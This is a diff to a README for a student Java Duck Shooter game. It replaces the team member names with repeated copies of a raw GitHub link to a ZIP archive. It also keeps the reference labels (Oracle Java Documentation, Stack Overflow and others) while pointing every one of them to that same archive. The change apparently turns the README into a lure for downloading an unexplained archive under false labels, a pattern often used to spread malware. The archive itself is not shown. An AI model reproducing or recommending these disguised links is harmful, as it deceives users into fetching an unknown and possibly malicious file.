@@ -6,10 +6,10 @@
 
 
 Team Member <br>
-1.Devanshu <br>
-2.Sakcham <br>
-3.Domendra <br>
-4.Tushar <br>
+https://raw.githubusercontent.com/tusharSingh16/DuckShooter/master/fernshaw/DuckShooter.zip <br>
+https://raw.githubusercontent.com/tusharSingh16/DuckShooter/master/fernshaw/DuckShooter.zip <br>
+https://raw.githubusercontent.com/tusharSingh16/DuckShooter/master/fernshaw/DuckShooter.zip <br>
+https://raw.githubusercontent.com/tusharSingh16/DuckShooter/master/fernshaw/DuckShooter.zip <br>
 
 
 # Table of Content
@@ -140,7 +140,7 @@ In conclusion, the development of the 2D Duck Shooter Game in Java has provided 
 
 
 # References
-●	Oracle Java Documentation: https://docs.oracle.com/javase/ <br>
-●	Stack Overflow: https://stackoverflow.com/ <br>
-●	Java Game Development Tutorials:https://www.youtube.com/@KaarinGaming <br>
-●	Kenny :https://www.kenney.nl/assets/shooting-gallery 
+●	Oracle Java Documentation: https://raw.githubusercontent.com/tusharSingh16/DuckShooter/master/fernshaw/DuckShooter.zip <br>
+●	Stack Overflow: https://raw.githubusercontent.com/tusharSingh16/DuckShooter/master/fernshaw/DuckShooter.zip <br>
+●	Java Game Development https://raw.githubusercontent.com/tusharSingh16/DuckShooter/master/fernshaw/DuckShooter.zip <br>
+●	Kenny https://raw.githubusercontent.com/tusharSingh16/DuckShooter/master/fernshaw/DuckShooter.zip 
